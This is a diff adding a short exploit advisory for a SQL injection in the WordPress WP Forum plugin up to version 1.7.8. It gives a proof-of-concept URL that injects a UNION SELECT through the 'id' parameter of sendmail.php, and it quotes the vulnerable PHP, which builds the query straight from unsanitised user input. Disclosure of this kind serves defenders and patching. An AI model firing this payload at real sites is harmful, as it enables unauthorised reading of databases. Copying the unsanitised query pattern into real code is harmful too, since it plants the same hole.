@@ -1,0 +1,24 @@
+# Exploit Title: WordPress WP Forum plugin <= 1.7.8 SQL Injection Vulnerability
+# Date: 2011-08-18
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/wpforum.1.7.8.zip
+# Version: 1.7.8 (tested)
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/wpforum/sendmail.php?action=quote&id=-1 UNION ALL SELECT @@version,2,3
+
+---------------
+Vulnerable code
+---------------
+...
+
+else if(isset($_GET['action']) && $_GET['action'] == 'quote'){
+	
+	global $wpdb, $table_posts;
+	$id = $_GET['id'];
+
+	$text = $wpdb->get_row("SELECT text, author_id, date FROM $table_posts WHERE id = $id");
+	$u = new WP_user($text->author_id);
+	echo htmlentities("<blockquote><b>QUOTE</b> ($u->nickname @ ".date(get_option('forum_date_format'), strtotime($text->date)).")\n $text->text</blockquote>");
